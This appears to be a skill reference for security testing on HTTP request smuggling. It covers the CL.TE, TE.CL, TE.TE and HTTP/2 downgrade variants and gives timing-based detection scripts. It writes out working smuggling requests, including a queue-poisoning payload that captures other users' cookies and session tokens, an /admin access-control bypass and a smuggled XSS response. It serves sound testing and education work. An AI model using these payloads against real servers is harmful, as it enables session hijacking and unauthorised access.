---
name: http_request_smuggling
description: HTTP request smuggling - CL.TE, TE.CL, TE.TE, H2.CL, H2.TE variants, detection, access control bypass, session hijacking
---

# HTTP Request Smuggling

HTTP request smuggling exploits discrepancies between how a front-end (reverse proxy/load balancer) and back-end server interpret ambiguous HTTP/1.1 request boundaries. The attacker smuggles a partial or complete hidden request that the back-end processes as a new, separate request — poisoning the request queue for subsequent users.

## Attack Surface

**Architecture Requirements**
- Chain of two+ HTTP servers (CDN → app, nginx → Gunicorn, HAProxy → IIS, Cloudflare → origin)
- Front-end and back-end interpret `Content-Length` or `Transfer-Encoding` headers differently
- HTTP/2 → HTTP/1.1 downgrade over persistent backend connections

**Variants**

| Type | Front-end uses | Back-end uses |
|------|---------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | Transfer-Encoding (obfuscated header) | Transfer-Encoding |
| H2.CL | HTTP/2 + Content-Length | HTTP/1.1 CL |
| H2.TE | HTTP/2 rewritten with TE header | HTTP/1.1 TE |

## CL.TE Smuggling

Front-end forwards by Content-Length; back-end processes Transfer-Encoding.

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Detection (time-based): if back-end uses TE, sending `0\r\n\r\n` terminates the connection but "SMUGGLED" sits in buffer. Next request gets mangled.

```python
# Time-based detection — CL.TE
# Send this request. If >10s delay, CL.TE confirmed.
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4

1
Z
Q
```

## TE.CL Smuggling

Front-end uses Transfer-Encoding; back-end uses Content-Length.

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

Detection (time-based for TE.CL):
```
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

## TE.TE (Obfuscated Transfer-Encoding)

One server processes the obfuscated header; the other ignores it and falls back to CL.

```
# Header obfuscation techniques
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
X: X\nTransfer-Encoding: chunked    # header injection
Transfer-Encoding: chunk ed          # space in value
Transfer-Encoding: \tchunked         # tab
X: X[\n]Transfer-Encoding: chunked
```

## H2.CL / H2.TE (HTTP/2 Downgrade)

HTTP/2 has no ambiguous framing (binary), but back-end rewrite to HTTP/1.1 can inject:

```
# H2.CL — send HTTP/2 with Content-Length shorter than body
:method POST
:path /
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
```

```
# H2.TE — inject Transfer-Encoding via HTTP/2 header
# (HTTP/2 pseudo-header injection via \r\n in header values)
foo: bar\r\nTransfer-Encoding: chunked
```

## Exploitation

### Queue Poisoning (Capture Other Users' Requests)

```
# Smuggle a prefix that captures the next user's request body
POST / HTTP/1.1
Host: example.com
Content-Length: 57
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: example.com
Content-Length: 600

comment=
```

The next victim's request body (containing cookies, session tokens) is appended to the comment field and stored in the application.

### Access Control Bypass

```
# Back-end receives /admin even though front-end blocks it
POST /anything HTTP/1.1
Host: example.com
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

### XSS via Smuggled Response

```
# Smuggle a 404 with XSS in body that next victim receives
POST / HTTP/1.1
Host: example.com
Content-Length: 166
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Host: example.com
X-Ignore: x"><script>alert(1)</script>
```

### Response Queue Poisoning (HTTP/2)

Forward tunnel attack: inject a complete response into the response stream so another user receives it.

## Detection Automation

Use `smuggler.py`:
```bash
python3 smuggler.py -u https://example.com/ -l 3
# Probes CL.TE, TE.CL, TE.TE, and obfuscated variants
# Reports timing anomalies and differential responses
```

Manual differential detection:
```python
import requests, time

def test_cl_te(url):
    """CL.TE: body=4 bytes but TE chunk signals end early"""
    r = requests.post(url,
        headers={"Transfer-Encoding": "chunked", "Content-Length": "4"},
        data=b"1\r\nZ\r\nQ",
        timeout=15, verify=False)
    return r.elapsed.total_seconds()

def test_te_cl(url):
    """TE.CL: TE says 0 but CL says 6"""
    r = requests.post(url,
        headers={"Content-Length": "6", "Transfer-Encoding": "chunked"},
        data=b"0\r\n\r\nX",
        timeout=15, verify=False)
    return r.elapsed.total_seconds()

url = "https://example.com/"
t1 = test_cl_te(url)
t2 = test_te_cl(url)
print(f"CL.TE probe: {t1:.1f}s | TE.CL probe: {t2:.1f}s")
# >10s = likely vulnerable
```

## Validation Approach

1. Time-based probe first — CL.TE then TE.CL; >10s = confirmed vulnerable
2. Differential probe — send two identical normal requests and watch for unexpected responses
3. Exploit with harmless end: smuggle `GET /404` and verify next request gets 404
4. Capture proxy request ID for each payload exchange
5. Do not use session-poisoning attacks that affect real users — use isolated test account

## Tools

- `smuggler.py` — automated detection
- Burp Suite HTTP Request Smuggler extension
- `turbo intruder` — for race condition + confirm
- Manual `send_request` with `Connection: keep-alive`
